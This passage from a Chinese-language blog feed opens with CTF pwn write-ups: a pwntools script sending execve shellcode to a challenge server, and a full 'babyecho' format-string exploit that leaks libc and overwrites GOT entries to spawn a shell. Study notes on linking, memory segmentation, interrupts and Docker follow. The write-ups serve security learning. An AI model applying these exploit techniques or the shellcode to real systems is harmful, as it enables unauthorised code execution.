class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">"stack.overflow.fail"</span>, <span class="number">9000</span>)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'</span></span><br><span class="line"></span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.sendline(<span class="string">"*"</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">0x4f</span> + <span class="string">"*"</span> + p64(<span class="number">0x601080</span>)<span class="comment">#bss</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">"asdf"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="babyecho"><a href="#babyecho" class="headerlink" title="babyecho"></a>babyecho</h2><p>Docker环境：<strong>docker pull muirelle/utctf:babyecho</strong></p><p>通过这道题好好学习一下泄露libc地址的办法</p><p><img src="https://i.imgur.com/BSGg2je.png" alt=""><br><img src="https://i.imgur.com/lHhIkPy.png" alt=""><br>常规检查</p><p><img src="https://i.imgur.com/t8cU0gW.png" alt=""><br>可以看到printf有明显的格式化字符串漏洞</p><p>但是并没有现成的system函数给我们利用，所以思路应该是通过格式化字符串泄露某个函数的在libc中的真实地址，通过工具<a href="https://github.com/niklasb/libc-database" target="_blank" rel="noopener">libc-database</a>找到libc基址，从而计算出system的地址。然后再考虑如何利用system达到getshell的目的。</p><h3 id="构造循环"><a href="#构造循环" class="headerlink" title="构造循环"></a>构造循环</h3><hr><p>首先，如果我们直接一来就利用printf泄露某个函数的地址的话，泄露完成后就会直接执行exit函数，这个漏洞只能被利用一次。</p><p>如果利用这个漏洞将exit的got表覆盖为main函数的地址，就可以构造出一个循环，在执行exit的时候实际是跳转回了main函数，从而多次利用漏洞。</p><p><img src="https://i.imgur.com/ajNyeuM.png" alt=""><br><code>objdump -dj .plt pwnable</code><br>先找到exit(<strong>0x804a01c</strong>)</p><p><img src="https://i.imgur.com/IBuLQu3.png" alt=""><br>然后是main(<strong>0x804851b</strong>)</p><p>再找到偏移</p><p>%n写入4个字节</p><p>%hn写入2个字节</p><p>%hhn写入1个字节</p><p><code>(python -c &#39;print &quot;AA&quot; + &quot;\x1c\xa0\x04\x08&quot; + &quot;\x1d\xa0\x04\x08&quot; + &quot;%17x%11$hhn%106x%12$hhn&quot;&#39; ;cat -) | ./pwnable</code></p><p>经过多次尝试之后找到了偏移为第11个参数。</p><p><img src="https://i.imgur.com/iYl5m5K.png" alt=""></p><p>可以看到已经覆盖了exit的地址为main，所以输入完了之后会回到main重新打印提示信息。所以我们现在可以多次利用这个漏洞了！</p><h3 id="泄露libc"><a href="#泄露libc" class="headerlink" title="泄露libc"></a>泄露libc</h3><hr><p>由于我们不能在got表中直接找到system的地址，所以要通过泄露libc基址的方式计算出system的地址。但运行这个文件的时候所有libc函数都是动态连接的，所以所有libc函数的地址都经过aslr随机化了。可是aslr只会将基址随机化，也就是说每个函数之间的相对偏移是不变的，如果能泄露出某个函数的地址，就能找到对应的libc版本，从而得到libc基址，进而知道每个函数的偏移量，最后计算出system的地址。</p><p>现在的问题就是如何泄露某个函数的地址。</p><p>我们知道当libc函数被调用之后，其got表相应的位置就会被替换为此函数在libc中真实的地址，所以如果我们可以泄露某个函数got表内的值，就能得到此函数的地址。但是%x和%p只能泄露栈上的地址，但是我们知道，%s可以打印对应地址的内容，再加上我们已经在上一步中有了任意位置写的能力，所以现在利用%s就可以任意位置读了。</p><p>现在试着读取一下puts的地址：</p><p><img src="https://i.imgur.com/UBHklY6.png" alt=""></p><p>成功得到了puts的真实地址<strong>0xb75c5ca0</strong>(每次运行这个地址都是会变化的，但是低12位不变)，接下来用libc-database工具查询一下对应的libc</p><p><img src="https://i.imgur.com/SVimSJR.png" alt=""><br>得到了puts偏移<strong>0x0005fca0</strong>，同时也得到了system偏移(<strong>0x0003ada0</strong>)</p><p>所以libc基址 = puts地址 - puts偏移<br>system地址 = libc基址 + system偏移</p><h3 id="劫持流程"><a href="#劫持流程" class="headerlink" title="劫持流程"></a>劫持流程</h3><hr><p>接下来要做的就是利用system来getshell。首先要考虑一下如何给system传递参数’/bin/sh’，因为没有/bin/sh拿到system也没用。</p><p>注意到程序中调用了<code>printf</code>函数，而<code>printf</code>函数需要一个参数，这个参数刚好是由fgets从用户读取的输入，也就是说如果我们将<code>printf</code>的got表内容覆盖为<code>system</code>的地址，再利用<code>fgets</code>输入<code>/bin/sh</code>，那么在调用<code>printf(&#39;/bin/sh&#39;)</code>时实际调用的则是<code>system(&#39;/bin/sh&#39;)</code>，进而拿到shell。</p><p>覆盖printf的地址分为三步，每次覆盖一个字节。</p><p>现在要考虑的问题是，每次得到的system地址都是不同的，在高位地址值小于地位地址值的时候如何才能保证将printf正确覆盖为system呢？利用高位溢出。</p><p>比如system地址为<strong>0xb7620da0</strong>，覆盖了一个字节为0xa0后，想要覆盖第二个字节为0x0d，但是前面已打印的字节数明显已经大于0x0d了，这时就用高位溢出来得到0x0d：</p><p>这时需要填充的字节为：0x100 - 0xa0 + 0x0d = 0x6d</p><p>若后面出现这种情况同理利用高位溢出。</p><h3 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h3><hr><p>最后的脚本</p><pre><code class="python"><span class="keyword">from</span> pwn <span class="keyword">import</span> *<span class="comment">#context.log_level = 'debug'</span>p = process(<span class="string">'./pwnable'</span>)main_addr = <span class="number">0x0804851B</span>exit_got = <span class="number">0x0804A01C</span>puts_got = <span class="number">0x0804A018</span>p.recv()<span class="comment">#creat a loop</span>payload1 = <span class="string">'AA'</span> + p32(exit_got) + p32(exit_got+<span class="number">1</span>)payload1 += <span class="string">'%17x%11$hhn%106x%12$hhn'</span>p.sendline(payload1)p.recv()<span class="comment">#leak libc</span>payload2 = <span class="string">'AA'</span> + p32(puts_got)payload2 += <span class="string">'%11$s'</span> + <span class="string">'BB'</span>p.sendline(payload2)puts_addr = int(hex(u32(p.recvuntil(<span class="string">'BB'</span>)[<span class="number">6</span>:<span class="number">10</span>]))[<span class="number">-8</span>:],<span class="number">16</span>)log.success(<span class="string">'puts_addr: '</span> + hex(puts_addr))puts_off = <span class="number">0x0005fca0</span>system_off = <span class="number">0x0003ada0</span>libc_base = puts_addr - puts_offsystem_addr = libc_base + system_offlog.success(<span class="string">'system_addr: '</span> + hex(system_addr))<span class="comment">#overwrite printf part1</span>printf_got = <span class="number">0x0804A010</span>payload3 = <span class="string">'AA'</span> + p32(printf_got) + p32(printf_got+<span class="number">1</span>) + p32(printf_got+<span class="number">2</span>)overwrite1 = int(hex(system_addr)[<span class="number">-2</span>:], <span class="number">16</span>)log.success(<span class="string">'try overwrite1: '</span> + hex(overwrite1))<span class="comment">#overwrite printf part2</span>try_overwrite2 = int(hex(system_addr)[<span class="number">-4</span>:<span class="number">-2</span>], <span class="number">16</span>)log.success(<span class="string">'try overwrite2: '</span> + hex(try_overwrite2))<span class="keyword">if</span>(try_overwrite2 &lt; overwrite1):        overwrite2 = <span class="number">0x100</span> - overwrite1 + try_overwrite2<span class="keyword">else</span>:        overwrite2 = try_overwrite2 - overwrite1payload3 += <span class="string">'%'</span> + str(overwrite2) + <span class="string">'x'</span> + <span class="string">'%12$hhn'</span>log.success(<span class="string">'overwrite2: '</span> + hex(overwrite2))<span class="comment">#overwrite printf part3</span>try_overwrite3 = int(hex(system_addr)[<span class="number">-6</span>:<span class="number">-4</span>], <span class="number">16</span>)log.success(<span class="string">'try overwrite3: '</span> + hex(try_overwrite3))<span class="keyword">if</span>(try_overwrite3 &lt; try_overwrite2):        overwrite3 = <span class="number">0x100</span> - try_overwrite2 + try_overwrite3<span class="keyword">else</span>:        overwrite3 = try_overwrite3 - try_overwrite2payload3 += <span class="string">'%'</span> + str(overwrite3) + <span class="string">'x'</span> + <span class="string">'%13$hhn'</span>log.success(<span class="string">'overwrite3: '</span> + hex(overwrite3))log.success(<span class="string">'payload3: '</span> + payload3)<span class="comment">#get shell</span>p.sendline(payload3)p.sendline(<span class="string">'/bin/sh'</span>)p.interactive()</code></pre><p>拿到shell<br><img src="https://i.imgur.com/CQ6NYOx.png" alt=""></p><p>参考：</p><p><a href="https://github.com/D4nch3n/Cyber-Competitions/blob/master/UTCTF/Babyecho/README.md" target="_blank" rel="noopener">https://github.com/D4nch3n/Cyber-Competitions/blob/master/UTCTF/Babyecho/README.md</a></p><p><a href="https://zh.wikipedia.org/wiki/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2" target="_blank" rel="noopener">格式化字符串</a></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> writeup </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>随笔</title>
      <link href="/2019/03/08/%E9%9A%8F%E7%AC%94/"/>
      <url>/2019/03/08/%E9%9A%8F%E7%AC%94/</url>
      
        <content type="html"><![CDATA[<p>一些笔记</p><a id="more"></a><h1 id="2019-3-8-特殊符号、符号修饰…"><a href="#2019-3-8-特殊符号、符号修饰…" class="headerlink" title="2019/3/8 特殊符号、符号修饰…"></a>2019/3/8 特殊符号、符号修饰…</h1><h2 id="特殊符号"><a href="#特殊符号" class="headerlink" title="特殊符号"></a>特殊符号</h2><hr><p>使用ld进行链接时，会在链接脚本中生成一些特殊符号。连接器在最终将程序链接成可执行文件时将其解析为正确的值。</p><p>__executable_start，该符号为程序起始地址（并非入口地址），比如0x8048000。</p><p>__etext，该符号为代码段结束地址，如0x80484d4。</p><p>_edata，该符号为数据段结束地址，如0x804963c。</p><p>_end，该符号为程序结束地址，如0x80496640。<br>等等。</p><p>可以在程序中直接使用这些符号，如：<br>printf(“executable start %x\n”, __executable_start);</p><h2 id="c-符号修饰"><a href="#c-符号修饰" class="headerlink" title="c++符号修饰"></a>c++符号修饰</h2><hr><p>为了支持c++的函数重载，命名空间等可能导致函数重名特性，引入了<strong>符号修饰</strong>的机制。</p><p>为此，每个函数都有一个独一无二的<strong>函数签名</strong>，包含了这个函数的各种信息（函数名，参数类型，所在的类名，命名空间等其他信息）。</p><p>gcc基本c++的名称修饰方法：所有符号以_Z开头，对于嵌套的名字（在命名空间或类中）后面紧跟“N”，然后依次在后面跟上从外层到内层的名字长度加名字，最后以E结尾。</p><p>比如：<strong>mynamespace::myclass::func</strong>经过修饰后变为<strong>_ZN11mynamespace7myclass4funcE</strong></p><p>并且E后面跟上参数列表，如果<strong>int</strong>型就跟 <strong>i</strong>，</p><p>最后变为<strong>_ZN11mynamespace7myclass4funcEi</strong></p><h2 id="c-包含c符号时避免符号修饰"><a href="#c-包含c符号时避免符号修饰" class="headerlink" title="c++包含c符号时避免符号修饰"></a>c++包含c符号时避免符号修饰</h2><hr><p>若c++代码包含c函数库的某个函数，则会将其当做c++函数并对其进行符号修饰，导致链接器无法将此符号与c库链接。</p><p>解决办法：条件宏判断配合c++宏<code>__cplusplus</code></p><p>例如：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __cplusplus</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">"C"</span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">memset</span><span class="params">(<span class="keyword">void</span> *, <span class="keyword">int</span> ,<span class="keyword">size_t</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __cplusplus</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>——《程序员的自我修养》</p><h1 id="2019-3-11-两步链接"><a href="#2019-3-11-两步链接" class="headerlink" title="2019/3/11 两步链接"></a>2019/3/11 两步链接</h1><h2 id="第一步：空间与地址分配"><a href="#第一步：空间与地址分配" class="headerlink" title="第一步：空间与地址分配"></a>第一步：空间与地址分配</h2><hr><p>扫描所有输入目标文件，获取各个段的长度，属性和位置，并将输入目标文件中的符号表中所有的符号定义和符号引用统一放到全局符号表。<br>这一步中，链接器能获得所有输入目标文件的段长度，并将他们合并，计算输出文件各个段合并后的长度与位置，并建立映射关系。</p><h2 id="第二步：符号解析与重定位"><a href="#第二步：符号解析与重定位" class="headerlink" title="第二步：符号解析与重定位"></a>第二步：符号解析与重定位</h2><hr><p>使用上一步收集到的信息，读取输入文件中段的数据、重定位信息，并进行符号解析和重定位、调整代码中的地址等。此过程特别是重定位过程是整个链接过程的核心。</p><p>——《程序员的自我修养》</p><h1 id="2019-3-13-C-operator"><a href="#2019-3-13-C-operator" class="headerlink" title="2019/3/13 C ??!??! operator"></a>2019/3/13 C ??!??! operator</h1><p>c语言 <strong>??!??!</strong> 运算符是啥鬼？</p><p><a href="https://stackoverflow.com/questions/7825055/what-does-the-c-operator-do" target="_blank" rel="noopener">https://stackoverflow.com/questions/7825055/what-does-the-c-operator-do</a></p><p>逛一圈so总能学点新东西\滑稽。</p><h1 id="2019-3-17-链接过程比喻"><a href="#2019-3-17-链接过程比喻" class="headerlink" title="2019/3/17 链接过程比喻"></a>2019/3/17 链接过程比喻</h1><p>如果把整个链接过程比作一台计算机，那么ld链接器就是计算机的cpu，所有的目标文件、库文件就是输入，链接结果输出的可执行文件就是输出，而链接控制脚本正是这台计算机的“程序”，它控制cpu的运行，以“程序”要求的方式将输入加工成所需要的输出结果。</p><p>——《程序员的自我修养》</p><h1 id="2019-3-18-可执行文件的装载"><a href="#2019-3-18-可执行文件的装载" class="headerlink" title="2019/3/18 可执行文件的装载"></a>2019/3/18 可执行文件的装载</h1><h2 id="可执行文件的装载"><a href="#可执行文件的装载" class="headerlink" title="可执行文件的装载"></a>可执行文件的装载</h2><hr><p>最开始可分为三步：</p><ol><li>创建一个独立的虚拟地址空间</li><li>读取可执行文件头，以<a href="https://en.wikipedia.org/wiki/Page_(computer_memory" target="_blank" rel="noopener"><strong>页</strong></a>为单位建立虚拟地址空间与可执行文件的映射</li><li>cpu的指令指向可执行文件入口，启动运行</li></ol><ul><li>创建虚拟地址空间时并不会立即将其各个页映射到相应的物理地址，实际上只是创建了一个页目录，等到运行程序触发<a href="https://en.wikipedia.org/wiki/Page_fault" target="_blank" rel="noopener"><strong>页错误</strong></a>时才会向物理地址申请相关页并进行映射。</li><li>系统从可执行文件中读取头部各个段(section)的信息，然后将其映射到虚拟空间的相应位置，虚拟空间中的一个段叫做<strong>虚拟内存区域</strong>(VMA,Virtual Memory Area)。</li><li>通过设置指令寄存器指向可执行文件入口，将控制权转交给进程。</li></ul><h2 id="虚拟内存的分布"><a href="#虚拟内存的分布" class="headerlink" title="虚拟内存的分布"></a>虚拟内存的分布</h2><hr><p>在第二步将可执行文件地址映射到虚拟空间时，由于存在页对齐机制，如果直接把每个段按页映射到虚拟空间就会造成空间浪费的问题。比如一个页大小规定为4KiB，有一个可执行文件有10个段，每个段都只有不到1KiB，但是在进行映射时每个段都要独自占用一个页，这样就造成了空间的极大浪费。所以自然会有方法来解决这种浪费。</p><p>操作系统装载可执行文件时并不关心各个段包含的内容，而是关心一些跟装载相关的问题，主要是段的权限。(如读，写，运行权限)。所以，对于具有相同权限的段(section)，把他们合并到一起进行映射(如 .text和.rodata)。</p><p>这种合并到一起具有多个section的段被称为segment。把这一个segment映射到虚拟空间中就只有一个与其对应的VMA，从而减少了碎片，节省了内存空间。</p><h3 id="区分section和segment"><a href="#区分section和segment" class="headerlink" title="区分section和segment"></a>区分section和segment</h3><p>section是链接视图，segment是装载视图</p><p><img src="https://i.imgur.com/YXhbulm.png" alt=""></p><p>在链接过程中，链接器需要将每一个section信息提取出来，为之后的重定位工作做准备。(可用<code>readelf -S file</code>查看)</p><p>而在装载的过程中，系统只关心section的属性，把它们整合成segment后映射到同一个VMA。为之后的创建进程映像做准备。(可用<code>readelf -l file</code>查看)</p><p>参考 :</p><p><a href="https://stackoverflow.com/questions/23379880/difference-between-program-header-and-section-header-in-elf" target="_blank" rel="noopener">https://stackoverflow.com/questions/23379880/difference-between-program-header-and-section-header-in-elf</a></p><p><a href="https://venkateshabbarapu.blogspot.com/2012/09/process-segments-and-vma.html" target="_blank" rel="noopener">https://venkateshabbarapu.blogspot.com/2012/09/process-segments-and-vma.html</a></p><p>——《程序员的自我修养》</p><h1 id="2019-3-23-interrupt-and-system-call"><a href="#2019-3-23-interrupt-and-system-call" class="headerlink" title="2019/3/23 interrupt and system call"></a>2019/3/23 interrupt and system call</h1><p>What’s the difference between <strong>interrupt</strong> and <strong>system call</strong>?</p><ul><li><strong>System calls</strong>: issued by user processes to request system services</li><li><strong>Interrupts</strong>: raised by decices to get OS attention</li><li>a interrupt usually caused by external hardware and a system call can also trigger an interrupt(soft interrupt)</li></ul><p><a href="https://stackoverflow.com/questions/33654579/in-an-operating-system-what-is-the-difference-between-a-system-call-and-an-inte/33654831" target="_blank" rel="noopener">https://stackoverflow.com/questions/33654579/in-an-operating-system-what-is-the-difference-between-a-system-call-and-an-inte/33654831</a></p><h1 id="2019-3-29-C-static-关键字限定对象作用域"><a href="#2019-3-29-C-static-关键字限定对象作用域" class="headerlink" title="2019/3/29 C static 关键字限定对象作用域"></a>2019/3/29 C static 关键字限定对象作用域</h1><p>如果在程序中给声明的对象前加了static关键字，则此对象对外不可见。</p><p>例子：</p><p>foo.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a = <span class="number">4</span>;</span><br><span class="line">bar(a);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>bar.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">bar</span><span class="params">(<span class="keyword">int</span> a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d\n"</span>,a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译</p><p><code>gcc -o fb foo.c bar.c</code></p><p>运行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/tmp/cckqp3JI.o: In function `main&apos;:</span><br><span class="line">foo.c:(.text+0x1a): undefined reference to `bar&apos;</span><br><span class="line">collect2: error: ld returned 1 exit status</span><br></pre></td></tr></table></figure><p>出错</p><p>这就是因为添加了static关键字导致bar函数对外不可见，所以编译时报出未定义的错误。不止函数，在变量前添加static也可以对外不可见。</p><p>顺便一提在编译时遇到警告：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">foo.c:6:2: warning: implicit declaration of function ‘bar’ [-Wimplicit-function-declaration]</span><br><span class="line">  bar(a);</span><br><span class="line">  ^~~</span><br></pre></td></tr></table></figure><p>是由于在foo开头未对bar函数进行声明。</p><p>在前面加上</p><p><code>extern void bar(int a);</code></p><p>即可消除警告。</p><p>——《c程序设计语言》</p><h1 id="2019-4-1-处理可变长参数表——va-list"><a href="#2019-4-1-处理可变长参数表——va-list" class="headerlink" title="2019/4/1 处理可变长参数表——va_list"></a>2019/4/1 处理可变长参数表——va_list</h1><p>形如<br><code>type func(type arg1, ...)</code><br>的函数声明，结尾的省略号表示该函数包含一个可变长的参数列表。比如<code>printf</code>就是这样定义的：<br><code>int printf(char *fmt, ...)</code><br>要遍历这些参数需要用到头文件&lt;stdarg.h&gt;中的一组宏定义。</p><p>va_list类型用于声明一个变量，改变量将依次引用各参数。暂定该变量名为ap，意思是“参数指针”。宏va_start将ap初始化为指向第一个无名参数的指针。在使用ap之前，该宏必须被调用一次。参数表必须至少包括一个有名参数作为起点。每次调用va_arg，该函数都将返回一个参数，并将ap指向下一个参数。va_arg使用一个类型名来决定返回的对象类型、指针移动和步长。最后，必须在函数返回之前调用va_end，以完成一些必要的清理工作。</p><p>——《c程序设计语言》</p><h1 id="2019-5-8-实模式和保护模式"><a href="#2019-5-8-实模式和保护模式" class="headerlink" title="2019/5/8 实模式和保护模式"></a>2019/5/8 实模式和保护模式</h1><p>8086芯片的工作模式为<strong>实模式</strong>。在实模式下，程序可以直接读写任意地址的内存，所以无法保证安全性。</p><p>8086有16条数据线和20条地址线。在寻址时，cpu给出16位的段地址和16位的偏移地址，内部总线将两个地址送入加法器中进行段地址×0x10 + 偏移地址 计算出20位的实际物理地址。</p><p>20位最多能达到1M的寻址能力，但通过段地址×0x10 + 偏移地址能达到的最大地址为</p><p><strong>0xffff×0x10 + 0xffff</strong></p><p><strong>＝ 0xffff0 + 0xffff</strong></p><p><strong>＝ 0x10ffef</strong></p><p>所以超出了1M的地址范围，但8086具有回卷机制（warp around），所以访问超过范围的地址并不会引发错误，而是从零开始继续计算地址。所以可以看成地址是对0x10000取模。</p><p>从80286开始加入了<strong>保护模式</strong>，保护模式将访问内存的权限分成0-3，4个等级，0为最高权限，具有直接控制和访问硬件的能力，数字越大代表权限越低。</p><p>80286拥有16条数据线和24条地址线，达到了2^24即最大16M的寻址能力。80286也有实模式，即只使用低20位地址线。但此时有一个问题：在使用实模式时，如果访问大于1M地址的内存，此时不会发生回卷，因为80286实际存在这些地址，并且会访问到这些地址，为了和8086保持兼容，采用的方法是将键盘上多余的一根线和A20（即第21根地址线）做与运算，为0时关闭，为1时打开。则当A20关闭时，程序就无法访问0x100000～0x10ffef间的内存。</p><h1 id="2019-5-9-分段机制"><a href="#2019-5-9-分段机制" class="headerlink" title="2019/5/9 分段机制"></a>2019/5/9 分段机制</h1><p>8086中为了解决16根数据线对20根地址线的寻址问题，采用了分段机制，即<strong>段地址×0x10 + 偏移</strong>来寻址。段地址（基址）由CS，DS，ES，SS等段寄存器给出，再加上cpu给出的偏移地址计算出最终内存中的物理地址。</p><p>在IA-32体系中，为了保持向下兼容，也使用分段机制，虽然后面可以用分页机制替代，但分页机制也是建立在分段机制的基础上的。<br>IA-32分段寻址模式较8086有所不同。首先，使用分段机制的原因有很多，主要是为了方便管理内存和安全性考虑。分段机制将程序员使用的逻辑地址转化为线性地址，整个过程大致如下：</p><ol><li>将16位段寄存器（如DS）中的值取出作为<strong>段选择子</strong>。</li><li>由段选择子中保存的信息选择内存中<strong>全局描述符表（GDT）</strong>中对应的<strong>段描述符</strong>。可以理解为在一个数组（GDT）中通过INDEX（段选择子）找到对应元素（段描述符）。</li><li>段描述符中保存了该段的各种信息，包括基址，最大偏移，特权级等等，经过一系列判断，若该次访问满足条件（如判断偏移是否超过最大偏移、权限是否高于或等于需要的权限）则从段描述符中取出基址，与偏移相加，计算出线性地址，线性地址即物理地址。这就是段式内存管理。</li></ol><p><img src="https://i.imgur.com/NdRTlAk.png" alt=""></p><h2 id="段选择子"><a href="#段选择子" class="headerlink" title="段选择子"></a>段选择子</h2><p>段选择子用来选择全局描述表中的段描述符。由<strong>索引</strong>(高13位)，<strong>表指示位</strong>(1位，用于指示选择的表是GDT还是LDT)，<strong>请求特权级</strong>(2位)组成。</p><h2 id="段描述符"><a href="#段描述符" class="headerlink" title="段描述符"></a>段描述符</h2><p>用于划分每一个段的段描述符一起组成了段描述符表，就像数组和元素的关系。每一个段描述符由三个参数(<strong>段基地址</strong>，<strong>段界限</strong>和<strong>段属性</strong>)进行定义。</p><h2 id="全局描述符表（GDT）"><a href="#全局描述符表（GDT）" class="headerlink" title="全局描述符表（GDT）"></a>全局描述符表（GDT）</h2><p>全局描述符表是用于定义和划分不同内存区域的数据结构：段的基址，大小和特权级等。这些被划分的内存区域被叫做<strong>段</strong>。</p><h1 id="2019-5-19-中断机制"><a href="#2019-5-19-中断机制" class="headerlink" title="2019/5/19 中断机制"></a>2019/5/19 中断机制</h1><p>80386芯片保护模式下处理中断过程：</p><ol><li>cpu接收到中断信号(如中断控制器8259A提供的中断信息、系统调用产生的中断信息(trap)、系统故障产生的中断信息(fault))。</li><li>cpu通过该中断号和<strong>中断描述符表寄存器</strong>(IDTR)的值找到该中断号在<strong>中断描述符表</strong>(IDT)中相应的<strong>中断门描述符</strong>(Gate Descriptor)</li><li>cpu通过<strong>中断门描述符</strong>中的<strong>段选择子</strong>找到<strong>全局描述符表</strong>(GDT)中相应的<strong>段描述符</strong>，再将<strong>段描述符</strong>中相应段的基址加上<strong>中断门描述符</strong>中的偏移得到<strong>中断服务例程</strong>的起始地址。</li><li>检查特权级并判断是否需要有特权级别转换。若当前程序运行在用户态，而中断服务例程需要在内核态运行，此时就会转换到内核栈并将用户态的ss和esp压栈保存下来。接着保护现场(依次将当前各个寄存器的值压栈)</li><li>中断服务例程的地址被加载到cs，eip中，开始执行中断服务例程</li></ol><p><img src="https://i.imgur.com/9Avk378.png" alt=""></p><p><strong>中断门描述符</strong>大小为8个字节，包含了该中断号对应的<strong>中断服务例程</strong>(ISR,Inerrupt Service Routine)所在段的段选择子(这里的段选择子就是GDT中的段选择子，用来选择GDT中的段描述符)和偏移，还有特权级等其他信息。</p><p><img src="https://i.imgur.com/sUOpCOI.png" alt=""></p>]]></content>
      
      
      
        <tags>
            
            <tag> 其他 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用docker复现ctf题目</title>
      <link href="/2019/03/07/%E4%BD%BF%E7%94%A8docker%E5%A4%8D%E7%8E%B0ctf%E9%A2%98%E7%9B%AE/"/>
      <url>/2019/03/07/%E4%BD%BF%E7%94%A8docker%E5%A4%8D%E7%8E%B0ctf%E9%A2%98%E7%9B%AE/</url>
      
        <content type="html"><![CDATA[<p>之前弄很久都没搞懂该怎么复现ctf题目，直到TAUMctfwp给了docker的环境才慢慢仿照dockerfile学会了怎么在本地复现题目。</p><a id="more"></a><p><a href="https://docs.docker.com/" target="_blank" rel="noopener">官方文档</a></p><h1 id="docker安装"><a href="#docker安装" class="headerlink" title="docker安装"></a>docker安装</h1><p>ubuntu：<strong><a href="https://docs.docker.com/install/linux/docker-ce/ubuntu/" target="_blank" rel="noopener">https://docs.docker.com/install/linux/docker-ce/ubuntu/</a></strong></p><p>windows：<strong><a href="https://hub.docker.com/editions/community/docker-ce-desktop-windows" target="_blank" rel="noopener">https://hub.docker.com/editions/community/docker-ce-desktop-windows</a></strong></p><p>安装window版要确保自己的windows是专业版并开启Hyper-V功能以兼容win版docker。</p><p>如果是windows家庭版去买个激活码升级一下就行了。</p><h1 id="docker基础操作"><a href="#docker基础操作" class="headerlink" title="docker基础操作"></a>docker基础操作</h1><h2 id="镜像-image"><a href="#镜像-image" class="headerlink" title="镜像(image)"></a>镜像(image)</h2><hr><p>查看本机镜像<br><code>docker image ls 或 docker images</code></p><p>删除镜像<br><code>docker image rm [imageName]</code></p><p>拉取镜像(以官方提供的hello-world镜像为例)<br><code>docker image pull library/hello-world</code></p><h2 id="容器-container"><a href="#容器-container" class="headerlink" title="容器(container)"></a>容器(container)</h2><hr><p>查看本机正在运行的容器，加上参数<code>-all</code>查看包括已停止的所有容器<br><code>docker container ls</code></p><p>运行容器<br><code>docker container run hello-world</code><br>若本地没有指定的镜像，则会自动拉取。</p><p>删除容器<br><code>docker container rm [CONTAINER ID]</code></p><h2 id="Dockerfile"><a href="#Dockerfile" class="headerlink" title="Dockerfile"></a>Dockerfile</h2><hr><p>如果要制作自己的镜像就需要用到Dockerfile配置镜像。</p><p>以TAUMctf的一道题给出的Dockerfile为例</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span 